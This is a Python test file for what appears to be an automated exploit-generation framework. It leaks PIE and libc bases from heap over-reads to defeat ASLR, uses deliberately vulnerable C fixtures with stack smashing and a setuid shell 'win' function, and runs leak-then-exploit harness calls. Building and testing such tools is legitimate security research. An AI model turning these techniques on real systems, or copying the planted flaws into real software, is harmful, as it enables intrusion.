"""An out-of-bounds READ that defeats ASLR from the program's own output.

This is the rung an OOB read was missing, and it is the one that stands between "we found
libtiff's bug" and "here is an exploit for it".

`oob_access_primitive` already shows the access is out of bounds and that the attacker chooses
HOW FAR -- an L2 disclosure primitive. What it could not say is whether the disclosed bytes are
worth anything, and that decides everything downstream: adjacent heap memory full of pointers
defeats ASLR, adjacent memory full of pixel data does not.

Two facts about the physics shape the design.

1. **The build that FINDS the bug cannot DEMONSTRATE the leak.** On an ASan build the process
   aborts inside the read, so nothing reaches stdout or the output file. The disclosure is
   observable only where the read SUCCEEDS -- the uninstrumented build.

2. **No output differencing is needed, and that matters.** The uninitialised-memory class was
   measured to be undecidable that way (one run's garbage looks like another's). A POINTER is
   different: its low 12 bits are page-invariant under ASLR, so a leaked value's `& 0xfff` equals
   the page offset of whatever symbol it points at, and a base is accepted only when the match is
   corroborated. A value that resolves to this binary's own symbol layout is not a coincidence --
   the leak validates itself against the target.

Measured on a real PIE fixture under real ASLR, checked against `/proc/<pid>/maps`: the libc base
was recovered in 8 of 8 runs and correct in all 8; the PIE base was recovered in 3 of 8 and
correct in all 3. Zero wrong bases -- when it cannot corroborate, it declines.
"""
from __future__ import annotations

import pathlib
import struct
import subprocess

import pytest
from lykos.analyze.poc import leak, rop
from lykos.analyze.poc.exploit import recover_pie_base

_SRC = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(void){ setvbuf(stdout,0,2,0);
  unsigned char *buf = malloc(64); memset(buf,'A',64);
  /* the NEXT allocation is what a forward over-read runs into, and it holds what a real heap
     neighbour holds: a code pointer into the image and a libc FILE pointer */
  void **nb = malloc(512);
  for (int i=0;i<64;i++) nb[i] = (i%2) ? (void*)&main : (void*)stdout;
  char line[64]; if(!fgets(line,sizeof line,stdin)) return 0;
  long n = strtol(line,0,10); if(n<=0) return 0;
  fwrite(buf,1,(size_t)n,stdout); return 0; }
"""


@pytest.fixture(scope="module")
def oob_pie(tmp_path_factory, gcc):
    d = tmp_path_factory.mktemp("oobleak")
    src = d / "oob.c"
    src.write_text(_SRC)
    exe = d / "oob"
    r = subprocess.run([gcc, "-fPIE", "-pie", "-fno-stack-protector", "-O0", "-w",
                        str(src), "-o", str(exe)], capture_output=True)
    if r.returncode:
        pytest.skip(f"fixture did not build: {r.stderr.decode()[:200]}")
    return exe


def _libc_bytes():
    for p in ("/usr/lib/x86_64-linux-gnu/libc.so.6", "/lib/x86_64-linux-gnu/libc.so.6"):
        if pathlib.Path(p).exists():
            return pathlib.Path(p).read_bytes()
    return b""


def test_an_in_bounds_read_discloses_nothing(oob_pie):
    """The control. Without it, "pointers in the output" could just be what the program prints."""
    out = subprocess.run([str(oob_pie)], input=b"64\n", capture_output=True, timeout=30).stdout
    r = leak.disclosed_bases(out, oob_pie.read_bytes(), _libc_bytes())
    assert r["proved"] is False, f"an in-bounds read claimed a leak: {r['note']}"
    assert r["pie_base"] is None and r["libc_base"] is None


def test_the_oob_read_defeats_aslr_and_the_base_is_the_real_one(oob_pie):
    """The claim, checked against the kernel rather than against itself."""
    tb, ld = oob_pie.read_bytes(), _libc_bytes()
    if not ld:
        pytest.skip("no system libc to anchor on")
    recovered = correct = 0
    for _ in range(8):
        p = subprocess.Popen([str(oob_pie)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        maps = ""
        for _ in range(400):                              # wait for execve to finish mapping
            try:
                maps = pathlib.Path(f"/proc/{p.pid}/maps").read_text()
            except OSError:
                break
            if "libc.so.6" in maps:
                break
        p.stdin.write(b"1024\n")
        p.stdin.flush()
        out, _ = p.communicate(timeout=30)
        libc_lines = [ln for ln in maps.splitlines() if "libc.so.6" in ln]
        if not libc_lines:
            continue
        true_libc = min(int(ln.split("-")[0], 16) for ln in libc_lines)
        r = leak.disclosed_bases(out, tb, ld)
        if r["libc_base"] is not None:
            recovered += 1
            correct += (r["libc_base"] == true_libc)
    assert recovered >= 1, "the OOB read never yielded a recoverable libc base"
    assert correct == recovered, f"{recovered - correct} of {recovered} bases were WRONG"


def test_a_wrong_base_is_never_preferred_to_no_base():
    """The property that makes this usable: it declines rather than guesses. Random
    pointer-shaped noise must not resolve to anything."""
    import random
    rng = random.Random(1234)
    noise = b"".join(struct.pack("<Q", (0x7F << 40) | rng.getrandbits(40)) for _ in range(64))
    r = leak.disclosed_bases(noise, b"\x7fELF" + bytes(64), _libc_bytes())
    assert r["pie_base"] is None, "random noise resolved to a PIE base"


def test_repetition_is_one_slot_not_many(oob_pie):
    """Why `allow_single` had to exist. A stack over-read hands over a dozen different slots; a
    heap neighbour commonly holds ONE distinctive pointer repeated at a fixed stride. Thirty-two
    copies of `stdout` are one slot, so the strict two-slot rule rejects a leak that is in fact
    unambiguous -- and uniqueness of the page-offset match is what makes accepting it safe."""
    out = subprocess.run([str(oob_pie)], input=b"1024\n", capture_output=True, timeout=30).stdout
    vals = leak._le_pointer_words(out, cap=4096)
    assert len(vals) > len(set(vals)), "the fixture no longer repeats its pointers"
    tb = oob_pie.read_bytes()
    strict = recover_pie_base(vals, tb)
    single = recover_pie_base(vals, tb, allow_single=True)
    assert strict is None or single is not None
    r = leak.disclosed_bases(out, tb, _libc_bytes())
    if r["proved"]:
        assert r["rule"] in ("corroborated", "unambiguous-single")


def test_the_libc_recoverer_got_the_same_rule():
    """Both halves of the leak need it, for the same reason, with the same contract."""
    import inspect
    assert "allow_single" in inspect.signature(rop.recover_libc_base).parameters
    doc = rop.recover_libc_base.__doc__ or ""
    assert "exactly one anchor" in doc.lower(), \
        "the single-slot rule is not documented as unambiguous"


def test_the_disclosure_says_what_it_proved_and_how():
    """An operator has to be able to tell a corroborated base from an unambiguous single one, and
    both from "pointers reached the output but resolve to nothing"."""
    r = leak.disclosed_bases(b"\x00" * 256, b"\x7fELF" + bytes(64))
    assert r["proved"] is False and "no pointer" in r["note"]
    noisy = b"".join(struct.pack("<Q", 0x7F0000000000 | (i * 0x1000)) for i in range(8))
    r2 = leak.disclosed_bases(noisy, b"\x7fELF" + bytes(64))
    assert r2["proved"] is False
    assert "pointer-shaped word" in r2["note"] or "no pointer" in r2["note"]

# ----------------------------------------------------------------------------------------------
# From here on: the rest of the chain -- turning the disclosure into a usable recipe, and then
# into a hijack. Everything below was found by running the whole thing on a real source drop.
# ----------------------------------------------------------------------------------------------

_CHAIN_SRC = r"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
void win(void){ setuid(0); execl("/bin/sh","sh",(char*)0); }
__attribute__((noinline)) static void greet(const char *d, size_t n){
  char name[64]; memcpy(name, d, n); puts(name); }
int main(void){ setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0);
  char *buf = (char*)malloc(64);
  void **nb = (void**)malloc(64);
  nb[0]=(void*)win; nb[1]=(void*)stdout; nb[2]=(void*)nb; nb[3]=(void*)win;
  memset(buf,'X',64);
  char line[512];
  for(;;){ ssize_t n = read(0,line,sizeof(line)-1); if(n<=0) return 0; line[n]=0;
    if(!strncmp(line,"show=",5)){ long w=strtol(line+5,NULL,10);
      if(w>0) fwrite(buf,1,(size_t)w,stdout); fflush(stdout); continue; }
    if(!strncmp(line,"name=",5)){ greet(line+5,(size_t)n-5); continue; }
    return 0; } }
"""


@pytest.fixture(scope="module")
def chain_pie(tmp_path_factory, gcc):
    """A PIE program with BOTH halves of a leak -> ROP chain behind structured commands.

    `show=<N>` over-reads a 64-byte heap buffer into its pointer-bearing neighbour; `name=<data>`
    smashes a 64-byte stack buffer in its own frame. Neither is reachable by an unstructured
    payload, which is the point -- a generic probe finds neither.
    """
    d = tmp_path_factory.mktemp("oobchain")
    src = d / "chain.c"
    src.write_text(_CHAIN_SRC)
    exe = d / "chain"
    r = subprocess.run([gcc, "-fPIE", "-pie", "-fno-stack-protector", "-O1", "-w",
                        "-U_FORTIFY_SOURCE", "-D_FORTIFY_SOURCE=0", str(src), "-o", str(exe)],
                       capture_output=True)
    if r.returncode:
        pytest.skip(f"fixture did not build: {r.stderr.decode()[:200]}")
    return exe


def test_more_disclosed_data_does_not_make_recovery_worse(chain_pie):
    """The bug this found: harvesting case-fold variants alongside the raw words BROKE recovery.

    `_case_fold_pointer_candidates` exists for a leak the viewer put through toupper/tolower, and
    every variant it emits is a near-miss of a real pointer with the SAME low 12 bits -- so it
    proposes a different base that is just as well anchored. Mixed in unconditionally they
    destroyed the uniqueness the single-slot rule rests on. Measured on this fixture: the raw
    words recovered the true base 10/10 and raw-plus-variants recovered it 3/10.

    So the variants are a FALLBACK, and this asserts the ordering holds -- not merely that one
    run happened to work.
    """
    tb = pathlib.Path(chain_pie).read_bytes()
    pie = libc = 0
    for _ in range(8):
        p = subprocess.run([str(chain_pie)], input=b"show=400", capture_output=True)
        d = leak.disclosed_bases(p.stdout, tb, _libc_bytes())
        pie += bool(d["pie_base"])
        libc += bool(d["libc_base"])
    # The PIE base is the deterministic half: one code-anchored candidate, every run.
    assert pie == 8, f"the image base resolved on only {pie}/8 runs"
    # The libc half is allowed to DECLINE. This leak holds exactly one libc pointer, so the
    # two-slot rule never applies and the single-slot rule carries it -- and that rule refuses
    # when a stale word in the dead chunk next door ties with it, which is the right answer and
    # happens about one run in thirty (measured 29/30). Declining is not the failure mode worth
    # guarding; a WRONG base is, and that is
    # `test_the_recovered_base_is_the_kernel_s_own`.
    assert libc >= 6, f"the libc base resolved on only {libc}/8 runs"


def test_a_lone_code_anchored_candidate_decides(chain_pie):
    """Several unambiguous candidates used to mean "give up", which is the wrong way round.

    A function entry or a return site is a sparse, structurally constrained page offset; .data and
    .bss offsets are dense and arbitrary, so a heap or stack value collides with one by chance.
    That is exactly how the two candidates fell here: `&win` proposed the true base from a
    FUNCTION anchor and the leaked heap chunk pointer proposed a second from an OBJECT anchor.
    """
    tb = pathlib.Path(chain_pie).read_bytes()
    out = subprocess.run([str(chain_pie)], input=b"show=400", capture_output=True).stdout
    words = list(leak._le_pointer_words(out))
    assert len(set(words)) >= 3, "the fixture should disclose a code, a libc and a heap pointer"
    assert recover_pie_base(words, tb) is None, "two distinct slots do not corroborate one base"
    base = recover_pie_base(words, tb, allow_single=True)
    assert base, "a lone code-anchored candidate is decisive"
    # and it is the RIGHT one: win must sit where the program's own symbol table says it does
    from lykos.analyze.poc.exploit import elf_functions
    assert base + elf_functions(tb)["win"] in words


def test_the_recovered_base_is_the_kernel_s_own(chain_pie, tmp_path):
    """The only check that cannot be satisfied by being self-consistent.

    A recovery that resolved every run to a plausible-looking wrong number would pass every test
    above. This one compares against `/proc/self/maps` read by the target itself.
    """
    src = tmp_path / "truth.c"
    src.write_text(_CHAIN_SRC.replace(
        "int main(void){ setvbuf(stdout,0,2,0);",
        'int main(void){ setvbuf(stdout,0,2,0);\n'
        '  { FILE *m=fopen("/proc/self/maps","r"); char l[512];\n'
        '    if(m){ if(fgets(l,sizeof l,m)) fprintf(stderr,"TRUE %.12s\\n", l); fclose(m);} }'))
    exe = tmp_path / "truth"
    import shutil
    cc = shutil.which("gcc") or shutil.which("clang")
    r = subprocess.run([cc, "-fPIE", "-pie", "-fno-stack-protector", "-O1", "-w",
                        "-U_FORTIFY_SOURCE", "-D_FORTIFY_SOURCE=0", str(src), "-o", str(exe)],
                       capture_output=True)
    if r.returncode:
        pytest.skip(f"oracle fixture did not build: {r.stderr.decode()[:200]}")
    tb = exe.read_bytes()
    seen = wrong = 0
    for _ in range(6):
        p = subprocess.run([str(exe)], input=b"show=400", capture_output=True)
        truth = int(p.stderr.split()[1], 16)
        got = leak.disclosed_bases(p.stdout, tb, _libc_bytes())["pie_base"]
        if got is not None:
            seen += 1
            wrong += (got != truth)
    assert seen == 6 and wrong == 0, f"recovered {seen}/6, {wrong} of them wrong"


def test_the_shell_probe_is_what_makes_a_silent_win_observable(tmp_path, gcc):
    """A `win()` that execve's a shell prints nothing, and this path closed stdin on it.

    The commonest win in existence -- `void win(void){ execl("/bin/sh", ...); }` -- emits no
    output, so a success regex can never match it. Worse, `leak_and_exploit` closed stdin right
    after the payload, so the shell it had just spawned read EOF and exited having run nothing.
    With a probe, stdin stays open and the nonce challenge comes back EVALUATED, which an echoing
    target cannot fake.
    """
    from lykos.analyze.poc import attribution
    src = tmp_path / "shellwin.c"
    # Deliberately not an overflow: this tests the HARNESS (does the probe reach the shell), so
    # the hijack is modelled by a direct branch and nothing else can be blamed for a failure.
    src.write_text(r"""
#include <stdio.h>
#include <string.h>
#include <unistd.h>
int main(void){ setvbuf(stdout,0,2,0);
  printf("ptr=%p\n", (void*)&main);
  /* a SMALL read, like the one a real target's input loop makes: the payload is longer than it,
     so the rest stays in the pipe for whatever runs next -- which is the shell. */
  char l[256]; ssize_t n=read(0,l,8); if(n<=0) return 0; l[n]=0;
  if(!strncmp(l,"GO",2)) execl("/bin/sh","sh",(char*)0);
  return 0; }
""")
    exe = tmp_path / "shellwin"
    r = subprocess.run([gcc, "-fPIE", "-pie", "-O0", "-w", str(src), "-o", str(exe)],
                       capture_output=True)
    if r.returncode:
        pytest.skip(f"fixture did not build: {r.stderr.decode()[:200]}")
    m = attribution.make_code_markers()
    # The payload is PADDED, as a real one is: `ret2win_input` fills to a fixed length after the
    # return address and those bytes are still in the pipe when the hijacked process execs. The
    # shell reads them as the start of its first line, so the probe arrived as `CCCCCCecho ...`
    # and came back `sh: 1: CCCCCCecho: not found` -- a real shell whose evidence was unreadable,
    # which grades exactly like no shell at all **[measured]**. Padding it here is the difference
    # between testing the probe and testing an idealised probe.
    common = dict(leak_regex=r"ptr=(0x[0-9a-f]+)", leak_base_offset=0,
                  payload_for_base=lambda base: b"GO\n" + b"C" * 64, timeout=6.0)
    with_probe = leak.leak_and_exploit(exe, [], success_regex=m.solved.decode("latin-1"),
                                       shell_probe=m.command, **common)
    assert with_probe["ok"], with_probe.get("reason")
    assert with_probe["success"], "the probe must reach the spawned shell and be evaluated"
    assert m.proves(with_probe["output"]), "solved form present, raw form absent -- not an echo"
    # and the control: WITHOUT a probe the same shell produces nothing at all, which is why
    # demanding an analyst-supplied regex refused this target rather than exploiting it.
    without = leak.leak_and_exploit(exe, [], success_regex=m.solved.decode("latin-1"), **common)
    assert without["ok"] and not without["success"]


def test_the_disclosure_recipe_crosses_without_the_distance_verdict():
    """`confirmed` on an out-of-bounds verdict is about CONTROL, not about worth.

    The disclosure carries its own verdict and is recorded only when that verdict passed. Gating
    the recipe on `confirmed` threw away a proved ASLR defeat for failing an unrelated test --
    measured on a `show=<N>` over-read whose distance did not move because raising a digit of
    `400` gives a smaller number that stays in bounds.
    """
    from lykos.analyze.poc import exploit_stage
    recipe = b"show=400"

    class _Content:
        def get_bytes(self, sha):
            assert sha == "deadbeef"
            return recipe

    class _Ctx:
        conn = object()
        content = _Content()

    payloads = [{"primitive": "oob-read", "confirmed": False, "mode": "stdin",
                 "disclosure": {"pie_base": 1, "libc_base": 2, "input_sha": "deadbeef",
                                "rule": "unambiguous-single", "note": "x"}}]

    class _Events:
        def __init__(self, conn):
            pass

        def payloads_of_type(self, *a, **k):
            return payloads

    import lykos.analyze.poc.exploit_stage as es
    old = es.EventDAO
    es.EventDAO = _Events
    try:
        assert exploit_stage._l2_disclosure_triggers(_Ctx(), type("T", (), {"id": 1})()) == [recipe]
        payloads[0]["mode"] = "file"          # a channel this recon cannot drive -> declined
        assert exploit_stage._l2_disclosure_triggers(_Ctx(), type("T", (), {"id": 1})()) == []
    finally:
        es.EventDAO = old


def test_a_proven_trigger_is_tried_before_the_speculative_sweep():
    """Seeding matters for cost as much as for reach: every speculative trigger spawns the target
    and waits out its timeout, and the sweep is deadline-bounded -- so a proven recipe placed
    after them can be cut off before it is ever sent."""
    import inspect
    src = inspect.getsource(leak.auto_provoke_leak)
    body = src[src.index('triggers = [b""]'):src.index("best = {")]
    assert body.index("extra_triggers") < body.index("seq[:read_cap]"), \
        "the proven trigger must be queued before the format-string and filler sweep"


def test_a_stale_pointer_does_not_outrank_a_live_one():
    """A wrong base is the worst answer this can give, and a tie used to decide it by dict order.

    An over-read returns live memory and DEAD memory together: a freed chunk holds whatever
    pointers used to be there, and one of those can match a curated anchor's page offset by
    chance. Both candidates then have one slot each, `max` broke the tie arbitrarily, and the
    function returned a confidently wrong base -- measured once in eight runs of a 1 KiB heap
    over-read under load. A caller cannot tell a wrong base from a right one; it can tell None.

    The evidence that separates them is already in the leak: a live pointer in a structured
    region repeats (an array of FILE* holds `stdout` in every element) and garbage does not.
    """
    ld = _libc_bytes()
    if not ld:
        pytest.skip("no system libc to anchor on")
    syms = rop.libc_symbols(ld, rop._LEAK_ANCHOR_SYMS)
    anchors: dict = {}
    for va in syms.values():
        anchors.setdefault(va & 0xFFF, []).append(va)
    uniq = {off: lst[0] for off, lst in anchors.items() if len(set(lst)) == 1}
    if len(uniq) < 2:
        pytest.skip("this libc does not expose two uniquely-offset anchors")
    (off_a, va_a), (off_b, va_b) = sorted(uniq.items())[:2]
    real, stale = 0x7F1234500000, 0x7F6789A00000
    live = real + va_a                                   # the pointer the program really holds
    junk = stale + va_b                                  # a leftover in the chunk next door

    # repeated live pointer + one stale word -> the repeated one decides
    got = rop.recover_libc_base([live] * 8 + [junk], ld, allow_single=True)
    assert got == real, f"expected {real:#x}, got {got and hex(got)}"
    # ...and the order it arrives in must not matter, which is exactly what used to decide it
    assert rop.recover_libc_base([junk] + [live] * 8, ld, allow_single=True) == real

    # one each: nothing distinguishes them, so the honest answer is no answer
    assert rop.recover_libc_base([live, junk], ld, allow_single=True) is None

    # and the strong rule is still the strong rule: two distinct slots under one base win
    # outright, however often a rival repeats.
    live2 = real + va_b
    assert rop.recover_libc_base([live, live2] + [junk] * 20, ld, allow_single=True) == real


def test_a_textual_length_field_is_probed_as_a_number(chain_pie):
    """The experiment that decides whether an over-read is a PRIMITIVE, on the shape that matters.

    `oob_access_primitive` asks one question: does the attacker choose how far out of bounds the
    access goes? The probe family claimed to cover "a field value -- a structured input sets the
    reach with a NUMBER" and only ever raised sampled BYTES, which is the opposite mutation for a
    textual field: adding 0x10 to a digit of `400` makes a non-digit, `strtol` stops there, the
    number gets SMALLER and the access comes back in bounds. Measured: 1 of 17 variants faulted,
    every distance identical, verdict "the distance did not move with the input" -- on a read
    whose length the attacker types. This is libtiff's shape, a length field driving one bulk
    read, so it is the one that had to work.
    """
    import shutil

    from lykos.analyze.debug.rootcause import parse_asan_report
    from lykos.analyze.poc import primitive
    from lykos.analyze.poc.primitive_stage import _probe_variants
    cc = shutil.which("gcc") or shutil.which("clang")
    asan = pathlib.Path(chain_pie).with_suffix(".asan")
    if not asan.exists():
        src = pathlib.Path(chain_pie).with_suffix(".c")
        if not src.exists():
            pytest.skip("fixture source not kept")
        r = subprocess.run([cc, "-fPIE", "-pie", "-O1", "-w", "-fsanitize=address,undefined",
                            "-fno-sanitize-recover=all", "-U_FORTIFY_SOURCE",
                            "-D_FORTIFY_SOURCE=0", str(src), "-o", str(asan)],
                           capture_output=True)
        if r.returncode:
            pytest.skip(f"sanitizer fixture did not build: {r.stderr.decode()[:200]}")

    labels = [lbl for lbl, _ in _probe_variants(b"show=400", b"", b"")]
    assert any(lbl.startswith("dec@") for lbl in labels), labels

    obs = []
    for lbl, data in _probe_variants(b"show=400", b"", b""):
        p = subprocess.run([str(asan)], input=data, capture_output=True)
        rep = parse_asan_report((p.stderr or b"").decode("utf-8", "replace"))
        if rep.get("class"):
            obs.append((lbl, rep))
    prim = primitive.oob_access_primitive(obs)
    assert prim is not None, "no variant reproduced the out-of-bounds read"
    assert prim["confirmed"], f"reach never moved across {len(obs)} faulting variant(s)"
    assert prim["type"] == "controlled-oob-read"
    assert prim["overrun_max"] > prim["overrun_min"], (prim["overrun_min"], prim["overrun_max"])
    assert "attacker chooses how far to read" in primitive.oob_effect(prim)


def test_the_reach_is_measured_past_the_end_not_from_the_start():
    """ASan reports where the access was CAUGHT; the magnitude of the defect is how far it ran.

    A bulk access that begins inside the object and is wider than what is left of it is caught at
    the object's own end -- `0 bytes after a 64-byte region` -- so a 400-byte read of a 64-byte
    buffer was recorded as distance 0 and described as "0 bytes past a 64-byte object", which
    reads as not out of bounds at all. `size` includes the in-bounds part, so `distance + size`
    overstates it by up to the region's size; the honest figure is whichever of the two bounds is
    larger, and never less than one byte.
    """
    from lykos.analyze.poc.primitive import _overrun
    assert _overrun({"side": "after", "distance": 0,
                     "access_size": 400, "region_size": 64}) == 336     # straddling bulk read
    assert _overrun({"side": "after", "distance": 16,
                     "access_size": 1, "region_size": 20}) == 17        # wholly past the end
    assert _overrun({"side": "after", "distance": 0,
                     "access_size": 1, "region_size": 20}) == 1         # one byte off the end
    assert _overrun({"side": "inside", "distance": 0,
                     "access_size": 400, "region_size": 64}) == 336     # same read, other wording
    assert _overrun({"side": "before", "distance": 8,
                     "access_size": 4, "region_size": 64}) == 8         # an underflow
    # the sanitizer did not say which side: invent nothing, and the caller keeps `distance`
    assert _overrun({"distance": 3, "access_size": 1, "region_size": 20}) is None


def test_a_bundle_names_the_binary_it_ships():
    """`meta["target_sha256"]` is written by the caller and names the INGESTED target.

    That used to be the same binary the bundle contained, and for a source drop it is not: the
    ingested target is the ASan+UBSan build and the chain is built against the uninstrumented
    twin, whose addresses -- and so every offset in the bundle -- are different. A reader cannot
    be left to work out which image the numbers belong to from a hash that does not match the
    file sitting next to them.
    """
    import hashlib
    import io
    import json
    import tarfile

    from lykos.analyze.poc import bundle
    shipped = b"\x7fELF-not-the-ingested-one"
    data = bundle.build(shipped, b"in", {"target_sha256": "a" * 64, "level": "L3"},
                        b"", "stdin", [], "SIGSEGV")
    with tarfile.open(fileobj=io.BytesIO(data)) as t:
        m = json.loads(t.extractfile("poc/meta.json").read())
        assert t.extractfile("poc/target.bin").read() == shipped
    assert m["exploited_sha256"] == hashlib.sha256(shipped).hexdigest()
    assert "uninstrumented build" in m["exploited_build"]

    # ...and when they ARE the same image it says nothing extra, because there is nothing to say.
    same = bundle.build(shipped, b"in",
                        {"target_sha256": hashlib.sha256(shipped).hexdigest(), "level": "L3"},
                        b"", "stdin", [], "SIGSEGV")
    with tarfile.open(fileobj=io.BytesIO(same)) as t:
        m2 = json.loads(t.extractfile("poc/meta.json").read())
    assert "exploited_build" not in m2 and m2["exploited_sha256"] == m["exploited_sha256"]


def test_the_disclosure_experiment_runs_under_real_randomization(tmp_path, gcc):
    """A verdict that claims ASLR is defeated must not be measured with ASLR switched off.

    Every other run in the primitive stage disables randomization on purpose -- a crash that
    reproduces at a stable address is what the other experiments need. For this one it hollows
    out the claim: the recovered base was 0x555555554000 every single time, the canonical
    no-ASLR load address, and "ASLR is defeated from the leak alone" was a statement about a
    process that had nothing to defeat. The method never needed the stability, so the experiment
    pays the real cost and `sandbox.run(aslr=True)` is what lets it.
    """
    from lykos.analyze.dynamic import sandbox
    src = tmp_path / "addr.c"
    src.write_text('#include <stdio.h>\nint main(void){ printf("%p\\n",(void*)&main); return 0; }\n')
    exe = tmp_path / "addr"
    r = subprocess.run([gcc, "-fPIE", "-pie", "-O0", "-w", str(src), "-o", str(exe)],
                       capture_output=True)
    if r.returncode:
        pytest.skip(f"fixture did not build: {r.stderr.decode()[:200]}")

    def addrs(aslr, n=6):
        out = set()
        for _ in range(n):
            res = sandbox.run(exe, timeout=5.0, aslr=aslr)
            line = (res.stdout or b"").strip()
            if line.startswith(b"0x"):
                out.add(int(line, 16))
        return out

    fixed = addrs(False)
    assert len(fixed) == 1, f"the default must still be deterministic, got {len(fixed)} addresses"
    moving = addrs(True)
    # Not "more than one in principle" -- more than one MEASURED, or the flag does nothing.
    assert len(moving) > 1, "aslr=True did not actually randomize the child"


def test_distillation_keeps_a_seed_whose_value_is_the_defect():
    """Coverage-based distillation cannot see the difference between `show=0` and `show=2**31-1`.

    They take the same branches, call the same function and touch the same basic blocks; the only
    difference is a NUMBER, and the number is the whole defect. So the minset dropped the seed
    that was added precisely because nothing in the campaign can regenerate it -- measured on an
    autonomous pass over a heap over-read driven by a length field: 121 seeds distilled to 1, the
    boundary seed among the 120 discarded, and the defect unreached in 900s even though a single
    execution of that seed reports it.

    `numeric_boundary_seeds` already says why it must survive -- blind mutation "effectively
    never emits the DECIMAL TEXT of a 9-10 digit number ... it is not a matter of budget" -- so a
    forced keep is the same contract a crash reproducer gets.
    """
    from lykos.analyze.fuzz import distill
    inputs = [b"show=0\n", b"show=2147483647\n", b"show=1\n"]
    cover = [{1, 2, 3}, {1, 2, 3}, {1, 2, 3}]        # indistinguishable by coverage, on purpose
    plain = [bytes(x) for x in distill.distill(inputs, cover)["kept"]]
    assert b"show=2147483647\n" not in plain, \
        "the premise of this test is that coverage alone drops it"
    forced = [bytes(x) for x in distill.distill(inputs, cover, keep_idx={1})["kept"]]
    assert b"show=2147483647\n" in forced


def test_the_fuzz_stage_marks_its_value_seeds_as_forced_keep():
    """The mechanism above is only worth having if the stage actually uses it.

    `value_seeds_for` is what connects them, and it has to agree with the seeder: the same
    `textconf.boundary_seeds` the corpus got, or the forced-keep set misses the very seeds it
    exists to protect.
    """
    from lykos.analyze.fuzz import stage as fstage
    from lykos.analyze.fuzz import textconf

    class _S:
        def __init__(self, v):
            self.value = v

    strings = ["show=", "name=", "quit", "%s"]

    class _Ctx:
        pass

    def _strings(ctx, target):
        return [_S(v) for v in strings]

    def _imports(ctx, target):
        return []

    old_s, old_i = fstage._strings_for, fstage._imports_for
    fstage._strings_for, fstage._imports_for = _strings, _imports
    try:
        got = fstage.value_seeds_for(_Ctx(), object())
    finally:
        fstage._strings_for, fstage._imports_for = old_s, old_i

    keys = textconf.keys_from(strings)
    assert "show" in keys, keys
    expected = {bytes(b) for b in textconf.boundary_seeds(keys) if b}
    assert expected and expected <= got, "the stage's forced-keep set must cover its own seeds"
    # and the wrap thresholds, which are the other shape of the same problem
    assert {bytes(b) for b in textconf.numeric_boundary_seeds() if b} <= got


def test_the_distill_call_actually_passes_the_forced_keep_set():
    """The two tests above check each END of the wiring; this checks the wire.

    Both of them still passed with the call site reduced to `keep_idx=set()` -- `value_seeds_for`
    computed the right seeds and `distill` honoured a `keep_idx` it was never given. Read as an
    AST rather than as text so a comment mentioning `keep_idx` cannot satisfy it, and so
    reformatting the call cannot break it.
    """
    import ast
    src = pathlib.Path("core/lykos/analyze/fuzz/stage.py").read_text()
    calls = [n for n in ast.walk(ast.parse(src))
             if isinstance(n, ast.Call)
             and isinstance(n.func, ast.Attribute) and n.func.attr == "distill_corpus"]
    assert calls, "the fuzz stage no longer distils its corpus; this test needs rewriting"
    for c in calls:
        kw = {k.arg for k in c.keywords}
        assert "keep_idx" in kw, "distill_corpus must be told what not to drop"
        arg = next(k.value for k in c.keywords if k.arg == "keep_idx")
        # ...and told something, not an empty literal: `keep_idx=set()` type-checks and lints
        # clean while silently restoring the bug.
        assert not (isinstance(arg, ast.Call) and getattr(arg.func, "id", "") == "set"
                    and not arg.args), "keep_idx must not be a hard-coded empty set"
        assert not isinstance(arg, (ast.Set, ast.Tuple, ast.List)) or getattr(arg, "elts", None), \
            "keep_idx must not be a hard-coded empty collection"
    # and the set it is given has to come from the stage's own value-seed rule
    assert "value_seeds_for(ctx, target)" in src
